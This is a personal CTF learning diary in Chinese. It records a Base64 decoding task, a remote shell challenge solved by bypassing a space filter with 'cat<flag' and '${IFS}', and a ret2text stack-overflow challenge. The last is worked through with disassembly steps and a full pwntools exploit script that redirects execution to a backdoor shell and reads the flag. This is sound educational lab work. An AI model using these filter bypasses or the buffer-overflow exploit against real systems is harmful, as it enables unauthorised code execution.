# 26-pwn-lavender
## 10月26号和29号
### 杂项1
### **ZmxhZ3tCYXNlNjRfaXNfY29tbW9ufQ==**
#### 一眼依托代码，结尾是==，前面代码的总长度是4的倍数，可推断为Base64
#### 打开浏览器，再 atob（“ZmxhZ3tCYXNlNjRfaXNfY29tbW9ufQ==”）
#### 得到flag ：**flag{Base64_is_common}**
#### 小结：当出现编码A-Z a-z 0-9 +/=，长度是4的倍数（=是补充符）
####       除了Base64，还有Base16(只有 0-9a-f)，Base32(只有 A-Z 2-7，长度常带 =)，Base58(去掉 0OIl，常用在比特币)
####       and so on
### 杂项2
### 远程题目，**空格被过滤了怎么办**
##### *不是海水过滤器（*
#### 根据题目，给了我一个地址 ：nc1.ctfplus.cn 40581
#### 用虚拟机连接上后，让我输入些什么，直接来个cat flag
#### ？but No space allowed in command
#### 输个ls，得到
#### mysh> ls
#### bin
#### dev
#### flag
#### ld-linux-x86-64.so.2
#### ib
#### lib32
#### lib64
#### libc.so.6
#### pwn
#### 根据题目提示，**空格被过滤了怎么办**
#### so？ cat<flag ,得到flag ：flag{914c3d1d-6525-473c-b6ab-48063beedb84}，好耶
#### 小结：cat<flag 中< 是重定向，不需要空格，等价于 cat flag
####       还有cat${IFS}flag ${IFS} 是 shell 的内置变量，值就是“空格/制表符/换行”，展开后变成空格，但过滤时看不到空格
### 杂项3
#### **找到一个神秘的参数，使之也能达到rce的效果**
#### ？啥是rce
#### 问问大肥鱼吧
#### o，远程控制代码，在别人的服务器上执行我的命令，(￣▽￣)"好耶
#### 这题让我找一个神秘参数，跟rce有一样效果的
#### $0就是神秘参数（大肥鱼告诉我的）
##### how？
#### 转16进制hex(1929392164)，得0x73003024
#### 每两位十六进制对应 1 个字节，and x86 使用小端序（little-endian）：低位字节存放在低地址
#### 地址        0x401202  0x401203  0x401204  0x401205
#### 字节        24        30        00        73
#### 其代表的字符 $  0  \0  s
#### 以前还没写过exp（，全是手敲的。so大肥鱼来教我编exp（wow）
#### nano exp.py来编写，python3 exp.py来运行#### （我把这个文件改为了dumb，希望它很dumb，我能直接找到答案，but显然不是）
#### 依旧一大坨我看不懂的玩意儿，but比第一次强，至少能看懂某些行在干什么
##### 学长a，你们是咋能手动编出这些玩意儿的〒▽〒 
## 10月29号
### 欢迎来到ret2text
#### chapter 1 **栈溢出**
##### https://b23.tv/hOppjl4（这个网站好像坏了）
#### 栈，内存，局部变量，函数参数，返回地址都存在里面
#### 栈溢出，内存长度超过了容量，是pwn中基础的漏洞
#### https://bbs.kanxue.com/thread-285201-1.htm 
##### 好抽象的玩意儿o(TヘTo)
## 10月30-31号
#### 学习栈溢出ing
## 11月1号
#### 不管了，来个题目试试
#### **ret2text2**
#### 检查安全性，file一下，看下它是个啥
#### 再来找目标nm -C ret2text2 | grep -E '[Tt]'
#### 找到00000000004011ca T backdoor 和0000000000401196 T vuln
#### 看看backdoor是干嘛的bjdump -d -M intel ret2text2 | sed -n '/<backdoor>:/,/^$/p'
#### 4011d2: lea    rdi, [rip+0xe2b]   # 0x402004 → "/bin/sh"
#### 4011de: call   system@plt
##### 只要跳到 0x4011ca就行了
#### 找漏洞点objdump -d -M intel ret2text2 | sed -n '/<vuln>:/,/^$/p'
#### 算偏移
#### 再把偏移加上即可
#### 写exp（大肥鱼帮写的）
##### import re, time
##### from pwn import *

##### context.log_level = 'info'
##### context.arch = 'amd64'

##### BIN = './ret2text2'
##### HOST, PORT = '127.0.0.1', 9999       

##### RET      = 0x40101a
##### BACKDOOR = 0x4011ca
##### OFFSET   = 0x100 + 8                  # 264

##### def start():
#####     if args.REMOTE:
#####         return remote(HOST, PORT)
#####     return process(BIN)

##### p = start()
##### p.recvuntil(b'easy challenge', timeout=5)

##### payload = flat(
#####     b'A' * OFFSET,
#####     RET,          # 栈对齐
#####     BACKDOOR,     # 跳到 backdoor()
##### )
##### p.sendline(payload)

##### time.sleep(0.4)
##### p.sendline(b'echo SHELL_OK; id; cat flag; cat /flag; exit')
##### out = p.recvall(timeout=4).decode(errors='replace')
##### print(out)

##### m = re.search(r'flag\{[^}]*\}', out)
##### if m:
#####     log.success('FLAG = %s', m.group())
##### else:
#####     log.warning('没抓到 flag（本地无 flag 文件属正常）')
